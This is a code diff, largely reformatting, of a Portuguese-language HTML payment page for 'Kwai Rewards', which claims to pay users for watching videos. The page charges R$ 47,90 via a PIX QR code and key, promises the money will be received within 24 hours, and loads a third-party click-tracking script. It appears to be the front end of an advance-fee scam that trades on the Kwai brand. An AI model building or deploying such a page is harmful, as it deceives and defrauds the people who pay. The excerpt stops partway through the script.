@@ -1,481 +1,506 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-    <script 
-        src="https://cdn.xtracky.com/scripts/utm-handler.js"
-        data-token="2fdecca8-9870-4260-81de-ab0eb47efee7"
-        data-click-id-param="click_id">
-</script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <head>
+    <script
+      src="https://cdn.xtracky.com/scripts/utm-handler.js"
+      data-token="2fdecca8-9870-4260-81de-ab0eb47efee7"
+      data-click-id-param="click_id"
+    ></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Kwai Rewards - PAGAMENTOS</title>
-    <meta name="description" content="A plataforma evolutiva que paga você para assistir e avaliar vídeos de qualidade.">
+    <meta
+      name="description"
+      content="A plataforma evolutiva que paga você para assistir e avaliar vídeos de qualidade."
+    />
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-        
-        .gradient-bg {
-            min-height: 100vh;
-            background: linear-gradient(135deg, #fff7ed 0%, #fef2f2 50%, #fdf2f8 100%);
-        }
-        
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 1rem 1.5rem;
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        
-        .logo-icon {
-            width: 2rem;
-            height: 2rem;
-            background: #f97316;
-            border-radius: 0.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .logo-text {
-            font-weight: bold;
-            font-size: 1.25rem;
-            color: #1f2937;
-        }
-        
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          sans-serif;
+      }
+
+      .gradient-bg {
+        min-height: 100vh;
+        background: linear-gradient(
+          135deg,
+          #fff7ed 0%,
+          #fef2f2 50%,
+          #fdf2f8 100%
+        );
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 1rem 1.5rem;
+      }
+
+      .logo-container {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .logo-icon {
+        width: 2rem;
+        height: 2rem;
+        background: #f97316;
+        border-radius: 0.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .logo-text {
+        font-weight: bold;
+        font-size: 1.25rem;
+        color: #1f2937;
+      }
+
+      .nav {
+        display: none;
+        align-items: center;
+        gap: 1.5rem;
+      }
+
+      @media (min-width: 768px) {
         .nav {
-            display: none;
-            align-items: center;
-            gap: 1.5rem;
+          display: flex;
         }
-        
-        @media (min-width: 768px) {
-            .nav {
-                display: flex;
-            }
+      }
+
+      .nav a {
+        color: #6b7280;
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+
+      .nav a:hover {
+        color: #1f2937;
+      }
+
+      .payment-container {
+        max-width: 28rem;
+        margin: 2rem auto;
+        padding: 0 1rem;
+      }
+
+      .payment-card {
+        background: white;
+        border-radius: 1rem;
+        padding: 2rem;
+        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1),
+          0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        border: 1px solid #f3f4f6;
+      }
+
+      .payment-title {
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        color: #1f2937;
+        margin-bottom: 0.5rem;
+      }
+
+      .payment-subtitle {
+        text-align: center;
+        color: #6b7280;
+        margin-bottom: 2rem;
+        font-size: 0.875rem;
+      }
+
+      .customer-info {
+        background: #f0f9ff;
+        border: 1px solid #bae6fd;
+        border-radius: 0.5rem;
+        padding: 1rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .customer-info-title {
+        font-weight: 600;
+        color: #075985;
+        margin-bottom: 0.5rem;
+        font-size: 0.875rem;
+      }
+
+      .customer-info-text {
+        color: #0c4a6e;
+        font-size: 0.875rem;
+        line-height: 1.4;
+      }
+
+      .qr-section {
+        text-align: center;
+        margin-bottom: 2rem;
+      }
+
+      .qr-code {
+        width: 200px;
+        height: 200px;
+        margin: 0 auto 1rem;
+        border: 2px solid #f3f4f6;
+        border-radius: 0.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #f9fafb;
+      }
+
+      .qr-code img {
+        width: 180px;
+        height: 180px;
+        border-radius: 0.25rem;
+      }
+
+      .amount-display {
+        background: linear-gradient(135deg, #f97316, #ea580c);
+        color: white;
+        padding: 1rem;
+        border-radius: 0.75rem;
+        text-align: center;
+        margin-bottom: 1.5rem;
+      }
+
+      .amount-label {
+        font-size: 0.875rem;
+        opacity: 0.9;
+        margin-bottom: 0.25rem;
+      }
+
+      .amount-value {
+        font-size: 2rem;
+        font-weight: bold;
+      }
+
+      .pix-key-section {
+        margin-bottom: 1.5rem;
+      }
+
+      .section-label {
+        font-weight: 600;
+        color: #374151;
+        margin-bottom: 0.5rem;
+        font-size: 0.875rem;
+      }
+
+      .pix-key-container {
+        position: relative;
+        display: flex;
+        gap: 0.5rem;
+      }
+
+      .pix-key-input {
+        flex: 1;
+        padding: 0.75rem;
+        border: 2px solid #e5e7eb;
+        border-radius: 0.5rem;
+        font-family: monospace;
+        font-size: 0.875rem;
+        background: #f9fafb;
+        color: #374151;
+      }
+
+      .copy-btn {
+        padding: 0.75rem 1rem;
+        background: #f97316;
+        color: white;
+        border: none;
+        border-radius: 0.5rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .copy-btn:hover {
+        background: #ea580c;
+      }
+
+      .copy-btn.copied {
+        background: #10b981;
+      }
+
+      .instructions {
+        background: #f0f9ff;
+        border: 1px solid #bae6fd;
+        border-radius: 0.5rem;
+        padding: 1rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .instructions-title {
+        font-weight: 600;
+        color: #075985;
+        margin-bottom: 0.5rem;
+        font-size: 0.875rem;
+      }
+
+      .instructions-text {
+        color: #0c4a6e;
+        font-size: 0.875rem;
+        line-height: 1.4;
+      }
+
+      .confirm-btn {
+        width: 100%;
+        padding: 1rem;
+        background: #10b981;
+        color: white;
+        border: none;
+        border-radius: 0.75rem;
+        font-weight: 600;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+      }
+
+      .confirm-btn:hover {
+        background: #059669;
+        transform: translateY(-1px);
+      }
+
+      .confirm-btn:disabled {
+        background: #9ca3af;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .success-message {
+        display: none;
+        background: #d1fae5;
+        border: 1px solid #a7f3d0;
+        border-radius: 0.75rem;
+        padding: 1rem;
+        margin-top: 1rem;
+        text-align: center;
+      }
+
+      .success-message.show {
+        display: block;
+        animation: slideDown 0.3s ease-out;
+      }
+
+      .success-icon {
+        width: 3rem;
+        height: 3rem;
+        background: #10b981;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 0.5rem;
+      }
+
+      .success-title {
+        font-weight: 600;
+        color: #065f46;
+        margin-bottom: 0.25rem;
+      }
+
+      .success-text {
+        color: #047857;
+        font-size: 0.875rem;
+      }
+
+      @keyframes slideDown {
+        from {
+          opacity: 0;
+          transform: translateY(-10px);
         }
-        
-        .nav a {
-            color: #6b7280;
-            text-decoration: none;
-            transition: color 0.2s;
+        to {
+          opacity: 1;
+          transform: translateY(0);
         }
-        
-        .nav a:hover {
-            color: #1f2937;
-        }
-        
-        .payment-container {
-            max-width: 28rem;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-        
-        .payment-card {
-            background: white;
-            border-radius: 1rem;
-            padding: 2rem;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-            border: 1px solid #f3f4f6;
-        }
-        
-        .payment-title {
-            text-align: center;
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #1f2937;
-            margin-bottom: 0.5rem;
-        }
-        
-        .payment-subtitle {
-            text-align: center;
-            color: #6b7280;
-            margin-bottom: 2rem;
-            font-size: 0.875rem;
-        }
-        
-        .customer-info {
-            background: #f0f9ff;
-            border: 1px solid #bae6fd;
-            border-radius: 0.5rem;
-            padding: 1rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        .customer-info-title {
-            font-weight: 600;
-            color: #075985;
-            margin-bottom: 0.5rem;
-            font-size: 0.875rem;
-        }
-        
-        .customer-info-text {
-            color: #0c4a6e;
-            font-size: 0.875rem;
-            line-height: 1.4;
-        }
-        
-        .qr-section {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-        
-        .qr-code {
-            width: 200px;
-            height: 200px;
-            margin: 0 auto 1rem;
-            border: 2px solid #f3f4f6;
-            border-radius: 0.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #f9fafb;
-        }
-        
-        .qr-code img {
-            width: 180px;
-            height: 180px;
-            border-radius: 0.25rem;
-        }
-        
-        .amount-display {
-            background: linear-gradient(135deg, #f97316, #ea580c);
-            color: white;
-            padding: 1rem;
-            border-radius: 0.75rem;
-            text-align: center;
-            margin-bottom: 1.5rem;
-        }
-        
-        .amount-label {
-            font-size: 0.875rem;
-            opacity: 0.9;
-            margin-bottom: 0.25rem;
-        }
-        
-        .amount-value {
-            font-size: 2rem;
-            font-weight: bold;
-        }
-        
-        .pix-key-section {
-            margin-bottom: 1.5rem;
-        }
-        
-        .section-label {
-            font-weight: 600;
-            color: #374151;
-            margin-bottom: 0.5rem;
-            font-size: 0.875rem;
-        }
-        
-        .pix-key-container {
-            position: relative;
-            display: flex;
-            gap: 0.5rem;
-        }
-        
-        .pix-key-input {
-            flex: 1;
-            padding: 0.75rem;
-            border: 2px solid #e5e7eb;
-            border-radius: 0.5rem;
-            font-family: monospace;
-            font-size: 0.875rem;
-            background: #f9fafb;
-            color: #374151;
-        }
-        
-        .copy-btn {
-            padding: 0.75rem 1rem;
-            background: #f97316;
-            color: white;
-            border: none;
-            border-radius: 0.5rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        
-        .copy-btn:hover {
-            background: #ea580c;
-        }
-        
-        .copy-btn.copied {
-            background: #10b981;
-        }
-        
-        .instructions {
-            background: #f0f9ff;
-            border: 1px solid #bae6fd;
-            border-radius: 0.5rem;
-            padding: 1rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        .instructions-title {
-            font-weight: 600;
-            color: #075985;
-            margin-bottom: 0.5rem;
-            font-size: 0.875rem;
-        }
-        
-        .instructions-text {
-            color: #0c4a6e;
-            font-size: 0.875rem;
-            line-height: 1.4;
-        }
-        
-        .confirm-btn {
-            width: 100%;
-            padding: 1rem;
-            background: #10b981;
-            color: white;
-            border: none;
-            border-radius: 0.75rem;
-            font-weight: 600;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-        
-        .confirm-btn:hover {
-            background: #059669;
-            transform: translateY(-1px);
-        }
-        
-        .confirm-btn:disabled {
-            background: #9ca3af;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .success-message {
-            display: none;
-            background: #d1fae5;
-            border: 1px solid #a7f3d0;
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin-top: 1rem;
-            text-align: center;
-        }
-        
-        .success-message.show {
-            display: block;
-            animation: slideDown 0.3s ease-out;
-        }
-        
-        .success-icon {
-            width: 3rem;
-            height: 3rem;
-            background: #10b981;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 0.5rem;
-        }
-        
-        .success-title {
-            font-weight: 600;
-            color: #065f46;
-            margin-bottom: 0.25rem;
-        }
-        
-        .success-text {
-            color: #047857;
-            font-size: 0.875rem;
-        }
-        
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .loading {
-            text-align: center;
-            color: #6b7280;
-            padding: 2rem;
-        }
-        
+      }
+
+      .loading {
+        text-align: center;
+        color: #6b7280;
+        padding: 2rem;
+      }
+
+      .nav-buttons {
+        display: none;
+      }
+
+      @media (min-width: 768px) {
         .nav-buttons {
-            display: none;
-        }
-        
-        @media (min-width: 768px) {
-            .nav-buttons {
-                display: block;
-            }
-            
-            .nav-btn {
-                position: fixed;
-                top: 50%;
-                transform: translateY(-50%);
-                width: 2.5rem;
-                height: 2.5rem;
-                background: rgba(255, 255, 255, 0.8);
-                backdrop-filter: blur(4px);
-                border: none;
-                border-radius: 0.5rem;
-                box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
-                cursor: pointer;
-                transition: all 0.2s;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-            }
-            
-            .nav-btn:hover {
-                background: white;
-            }
-            
-            .nav-btn.left {
-                left: 1rem;
-            }
-            
-            .nav-btn.right {
-                right: 1rem;
-            }
+          display: block;
         }
 
-        /* Estilos para o pop-up */
-        .popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+        .nav-btn {
+          position: fixed;
+          top: 50%;
+          transform: translateY(-50%);
+          width: 2.5rem;
+          height: 2.5rem;
+          background: rgba(255, 255, 255, 0.8);
+          backdrop-filter: blur(4px);
+          border: none;
+          border-radius: 0.5rem;
+          box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+          cursor: pointer;
+          transition: all 0.2s;
+          display: flex;
+          align-items: center;
+          justify-content: center;
         }
 
-        .popup-content {
-            background: white;
-            padding: 2rem;
-            border-radius: 0.75rem;
-            text-align: center;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-            max-width: 400px;
-            width: 90%;
+        .nav-btn:hover {
+          background: white;
         }
 
-        .popup-content h2 {
-            color: #f97316;
-            margin-bottom: 1rem;
+        .nav-btn.left {
+          left: 1rem;
         }
 
-        .popup-content p {
-            color: #374151;
-            margin-bottom: 1.5rem;
+        .nav-btn.right {
+          right: 1rem;
         }
+      }
 
-        .popup-content button {
-            background: #f97316;
-            color: white;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 0.5rem;
-            cursor: pointer;
-            font-weight: 600;
-            transition: background 0.2s;
-        }
+      /* Estilos para o pop-up */
+      .popup-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
 
-        .popup-content button:hover {
-            background: #ea580c;
-        }
+      .popup-content {
+        background: white;
+        padding: 2rem;
+        border-radius: 0.75rem;
+        text-align: center;
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        max-width: 400px;
+        width: 90%;
+      }
 
-        /* Estilos para o redirecionamento */
-        .redirect-message {
-            display: none;
-            background: #d1fae5;
-            border: 1px solid #a7f3d0;
-            border-radius: 0.75rem;
-            padding: 1.5rem;
-            margin-top: 1rem;
-            text-align: center;
-            animation: slideDown 0.3s ease-out;
-        }
+      .popup-content h2 {
+        color: #f97316;
+        margin-bottom: 1rem;
+      }
 
-        .redirect-message.show {
-            display: block;
-        }
+      .popup-content p {
+        color: #374151;
+        margin-bottom: 1.5rem;
+      }
 
-        .redirect-title {
-            font-weight: 600;
-            color: #065f46;
-            margin-bottom: 0.5rem;
-            font-size: 1.1rem;
-        }
+      .popup-content button {
+        background: #f97316;
+        color: white;
+        border: none;
+        padding: 0.75rem 1.5rem;
+        border-radius: 0.5rem;
+        cursor: pointer;
+        font-weight: 600;
+        transition: background 0.2s;
+      }
 
-        .redirect-text {
-            color: #047857;
-            font-size: 0.875rem;
-            margin-bottom: 1rem;
-        }
+      .popup-content button:hover {
+        background: #ea580c;
+      }
 
-        .redirect-countdown {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #10b981;
-            margin-bottom: 0.5rem;
-        }
+      /* Estilos para o redirecionamento */
+      .redirect-message {
+        display: none;
+        background: #d1fae5;
+        border: 1px solid #a7f3d0;
+        border-radius: 0.75rem;
+        padding: 1.5rem;
+        margin-top: 1rem;
+        text-align: center;
+        animation: slideDown 0.3s ease-out;
+      }
 
-        .redirect-label {
-            color: #047857;
-            font-size: 0.875rem;
-        }
+      .redirect-message.show {
+        display: block;
+      }
+
+      .redirect-title {
+        font-weight: 600;
+        color: #065f46;
+        margin-bottom: 0.5rem;
+        font-size: 1.1rem;
+      }
+
+      .redirect-text {
+        color: #047857;
+        font-size: 0.875rem;
+        margin-bottom: 1rem;
+      }
+
+      .redirect-countdown {
+        font-size: 2rem;
+        font-weight: bold;
+        color: #10b981;
+        margin-bottom: 0.5rem;
+      }
+
+      .redirect-label {
+        color: #047857;
+        font-size: 0.875rem;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="gradient-bg">
-        <header class="header">
-            <div class="logo-container">
-                <div class="logo-icon">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-white fill-white">
-                        <polygon points="6 3 20 12 6 21 6 3"></polygon>
-                    </svg>
-                </div>
-                <span class="logo-text">Kwai Rewards</span>
-            </div>
-            <nav class="nav">
-                <a href="#">Home</a>
-                <a href="#">Explorar</a>
-                <a href="#">Meus Vídeos</a>
-                <a href="#">Configurações</a>
-            </nav>
-        </header>
+      <header class="header">
+        <div class="logo-container">
+          <div class="logo-icon">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              class="w-4 h-4 text-white fill-white"
+            >
+              <polygon points="6 3 20 12 6 21 6 3"></polygon>
+            </svg>
+          </div>
+          <span class="logo-text">Kwai Rewards</span>
+        </div>
+        <nav class="nav">
+          <a href="#">Home</a>
+          <a href="#">Explorar</a>
+          <a href="#">Meus Vídeos</a>
+          <a href="#">Configurações</a>
+        </nav>
+      </header>
 
-        <div class="payment-container">
-            <div class="payment-card">
-                <h1 class="payment-title">Kwai Rewards</h1>
-                <p class="payment-subtitle">Escaneie o QR Code ou copie a chave PIX para realizar o pagamento<br>
-                <small style="color: #f97316; font-weight: 600;">Transação: #<span id="transactionId">Carregando...</span></small></p>
+      <div class="payment-container">
+        <div class="payment-card">
+          <h1 class="payment-title">Kwai Rewards</h1>
+          <p class="payment-subtitle">
+            Escaneie o QR Code ou copie a chave PIX para realizar o pagamento<br />
+            <small style="color: #f97316; font-weight: 600"
+              >Transação: #<span id="transactionId">Carregando...</span></small
+            >
+          </p>
 
-                <!-- <div id="customerInfo" class="customer-info" style="display: none;">
+          <!-- <div id="customerInfo" class="customer-info" style="display: none;">
                     <div class="customer-info-title">Dados do Cliente:</div>
                     <div class="customer-info-text">
                         <strong>Nome:</strong> <span id="customerName">-</span><br>
@@ -483,430 +508,541 @@
                     </div>
                 </div> -->
 
-                <div class="amount-display">
-                    <div class="amount-label">Valor a pagar:</div>
-                    <div class="amount-value">R$ <span id="amountValue">47,90</span></div>
-                </div>
-
-                <div id="loadingMessage" class="loading">
-                    Carregando dados do PIX...
-                </div>
-
-                <div id="pixContent" style="display: none;">
-                    <div class="qr-section">
-                        <div class="qr-code">
-                            <img id="qrCodeImage" src="" alt="QR Code PIX">
-                        </div>
-                        <p style="color: #6b7280; font-size: 0.875rem;">Escaneie com o app do seu banco</p>
-                    </div>
-
-                    <div class="pix-key-section">
-                        <div class="section-label">Chave PIX (Copia e Cola):</div>
-                        <div class="pix-key-container">
-                            <input 
-                                type="text" 
-                                class="pix-key-input" 
-                                value=""
-                                readonly
-                                id="pixKey"
-                            >
-                            <button class="copy-btn" onclick="copyPixKey()">
-                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"/>
-                                    <path d="m4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>
-                                </svg>
-                                <span id="copyText">Copiar</span>
-                            </button>
-                        </div>
-                    </div>
-
-                    <div class="instructions">
-                        <div class="instructions-title">Como pagar:</div>
-                        <div class="instructions-text">
-                            1. Abra o app do seu banco<br>
-                            2. Procure por "PIX" ou "Pagamentos"<br>
-                            3. Escaneie o QR Code ou cole a chave PIX<br>
-                            4. Confirme o pagamento de R$ <span id="instructionAmount">47,90</span><br>
-                            5. Clique em "Confirmei o Pagamento" abaixo<br><br>
-                            <strong>⏰ Expira em: <span id="expirationDate">Carregando...</span></strong>
-                        </div>
-                    </div>
-
-                    <button class="confirm-btn" id="confirmBtn" onclick="confirmPayment()" style="display: none;">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M9 12l2 2 4-4"/>
-                            <circle cx="12" cy="12" r="10"/>
-                        </svg>
-                        Confirmei o Pagamento
-                    </button>
-
-                    <div style="background: #f0f9ff; border: 1px solid #0ea5e9; border-radius: 0.75rem; padding: 1rem; text-align: center;">
-                        <div style="color: #0c4a6e; font-weight: 600; margin-bottom: 0.5rem; font-size: 0.875rem;">
-                            ⚡ Detecção Automática
-                        </div>
-                        <div style="color: #075985; font-size: 0.875rem;">
-                            Seu pagamento será confirmado automaticamente após a aprovação no banco. Não é necessário clicar em nenhum botão!
-                        </div>
-                    </div>
-
-                    <div class="success-message" id="successMessage">
-                        <div class="success-icon">
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
-                                <path d="M9 12l2 2 4-4"/>
-                            </svg>
-                        </div>
-                        <div class="success-title">Pagamento Confirmado!</div>
-                        <div class="success-text">Seu pagamento foi processado com sucesso. Você receberá o valor em até 24 horas.</div>
-                    </div>
-
-                    <!-- Nova mensagem de redirecionamento -->
-                    <div class="redirect-message" id="redirectMessage">
-                        <div class="redirect-title">🎉 Redirecionando...</div>
-                        <div class="redirect-text">Você será redirecionado para a página de confirmação em:</div>
-                        <div class="redirect-countdown" id="redirectCountdown">3</div>
-                        <div class="redirect-label">segundos</div>
-                    </div>
-                </div>
+          <div class="amount-display">
+            <div class="amount-label">Valor a pagar:</div>
+            <div class="amount-value">
+              R$ <span id="amountValue">47,90</span>
             </div>
-        </div>
+          </div>
 
-        <div class="nav-buttons">
-            <button class="nav-btn left">
-                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="m15 18-6-6 6-6"></path>
-                </svg>
+          <div id="loadingMessage" class="loading">
+            Carregando dados do PIX...
+          </div>
+
+          <div id="pixContent" style="display: none">
+            <div class="qr-section">
+              <div class="qr-code">
+                <img id="qrCodeImage" src="" alt="QR Code PIX" />
+              </div>
+              <p style="color: #6b7280; font-size: 0.875rem">
+                Escaneie com o app do seu banco
+              </p>
+            </div>
+
+            <div class="pix-key-section">
+              <div class="section-label">Chave PIX (Copia e Cola):</div>
+              <div class="pix-key-container">
+                <input
+                  type="text"
+                  class="pix-key-input"
+                  value=""
+                  readonly
+                  id="pixKey"
+                />
+                <button class="copy-btn" onclick="copyPixKey()">
+                  <svg
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                  >
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2" />
+                    <path
+                      d="m4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"
+                    />
+                  </svg>
+                  <span id="copyText">Copiar</span>
+                </button>
+              </div>
+            </div>
+
+            <div class="instructions">
+              <div class="instructions-title">Como pagar:</div>
+              <div class="instructions-text">
+                1. Abra o app do seu banco<br />
+                2. Procure por "PIX" ou "Pagamentos"<br />
+                3. Escaneie o QR Code ou cole a chave PIX<br />
+                4. Confirme o pagamento de R$
+                <span id="instructionAmount">47,90</span><br />
+                5. Clique em "Confirmei o Pagamento" abaixo<br /><br />
+                <strong
+                  >⏰ Expira em:
+                  <span id="expirationDate">Carregando...</span></strong
+                >
+              </div>
+            </div>
+
+            <button
+              class="confirm-btn"
+              id="confirmBtn"
+              onclick="confirmPayment()"
+              style="display: none"
+            >
+              <svg
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path d="M9 12l2 2 4-4" />
+                <circle cx="12" cy="12" r="10" />
+              </svg>
+              Confirmei o Pagamento
             </button>
-            <button class="nav-btn right">
-                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="m9 18 6-6-6-6"></path>
+
+            <div
+              style="
+                background: #f0f9ff;
+                border: 1px solid #0ea5e9;
+                border-radius: 0.75rem;
+                padding: 1rem;
+                text-align: center;
+              "
+            >
+              <div
+                style="
+                  color: #0c4a6e;
+                  font-weight: 600;
+                  margin-bottom: 0.5rem;
+                  font-size: 0.875rem;
+                "
+              >
+                ⚡ Detecção Automática
+              </div>
+              <div style="color: #075985; font-size: 0.875rem">
+                Seu pagamento será confirmado automaticamente após a aprovação
+                no banco. Não é necessário clicar em nenhum botão!
+              </div>
+            </div>
+
+            <div class="success-message" id="successMessage">
+              <div class="success-icon">
+                <svg
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="white"
+                  stroke-width="3"
+                >
+                  <path d="M9 12l2 2 4-4" />
                 </svg>
-            </button>
+              </div>
+              <div class="success-title">Pagamento Confirmado!</div>
+              <div class="success-text">
+                Seu pagamento foi processado com sucesso. Você receberá o valor
+                em até 24 horas.
+              </div>
+            </div>
+
+            <!-- Nova mensagem de redirecionamento -->
+            <div class="redirect-message" id="redirectMessage">
+              <div class="redirect-title">🎉 Redirecionando...</div>
+              <div class="redirect-text">
+                Você será redirecionado para a página de confirmação em:
+              </div>
+              <div class="redirect-countdown" id="redirectCountdown">3</div>
+              <div class="redirect-label">segundos</div>
+            </div>
+          </div>
         </div>
+      </div>
+
+      <div class="nav-buttons">
+        <button class="nav-btn left">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="20"
+            height="20"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path d="m15 18-6-6 6-6"></path>
+          </svg>
+        </button>
+        <button class="nav-btn right">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="20"
+            height="20"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path d="m9 18 6-6-6-6"></path>
+          </svg>
+        </button>
+      </div>
     </div>
 
     <!-- Pop-up de Pagamento Pendente -->
     <div id="pendingPaymentPopup" class="popup-overlay">
-        <div class="popup-content">
-            <h2>Pagamento Pendente</h2>
-            <p>Seu pagamento ainda não foi confirmado. Por favor, conclua o pagamento em seu aplicativo bancário.</p>
-            <button onclick="closePopup()">Entendi</button>
-        </div>
+      <div class="popup-content">
+        <h2>Pagamento Pendente</h2>
+        <p>
+          Seu pagamento ainda não foi confirmado. Por favor, conclua o pagamento
+          em seu aplicativo bancário.
+        </p>
+        <button onclick="closePopup()">Entendi</button>
+      </div>
     </div>
 
     <script src="../api_genesys/qrious.min.js"></script>
     <script>
-        // Função para obter parâmetros da URL
-        function getUrlParameter(name) {
-            name = name.replace(/[\\\[]/, '\\\[').replace(/[\\\]]/, '\\\]');
-            var regex = new RegExp('[\\\\?&]' + name + '=([^&#]*)');
-            var results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-        }
+      // Função para obter parâmetros da URL
+      function getUrlParameter(name) {
+        name = name.replace(/[\\\[]/, "\\\[").replace(/[\\\]]/, "\\\]");
+        var regex = new RegExp("[\\\\?&]" + name + "=([^&#]*)");
+        var results = regex.exec(location.search);
+        return results === null
+          ? ""
+          : decodeURIComponent(results[1].replace(/\+/g, " "));
+      }
 
-        // Função para gerar QR Code
-        function generateQRCode(pixPayload) {
-            try {
-                // Criar um canvas para o QR Code
-                const canvas = document.createElement('canvas');
-                const qr = new QRious({
-                    element: canvas,
-                    value: pixPayload,
-                    size: 180,
-                    background: 'white',
-                    foreground: 'black'
-                });
-                
-                // Converter canvas para imagem e definir como src
-                const qrCodeImage = document.getElementById('qrCodeImage');
-                qrCodeImage.src = canvas.toDataURL();
-                qrCodeImage.style.display = 'block';
-            } catch (error) {
-                console.error('Erro ao gerar QR Code:', error);
-                // Fallback: mostrar o payload como texto
-                document.getElementById('qrCodeImage').style.display = 'none';
-                document.querySelector('.qr-code').innerHTML = '<p style="font-size: 12px; word-break: break-all;">' + pixPayload + '</p>';
+      // Função para gerar QR Code
+      function generateQRCode(pixPayload) {
+        try {
+          // Criar um canvas para o QR Code
+          const canvas = document.createElement("canvas");
+          const qr = new QRious({
+            element: canvas,
+            value: pixPayload,
+            size: 180,
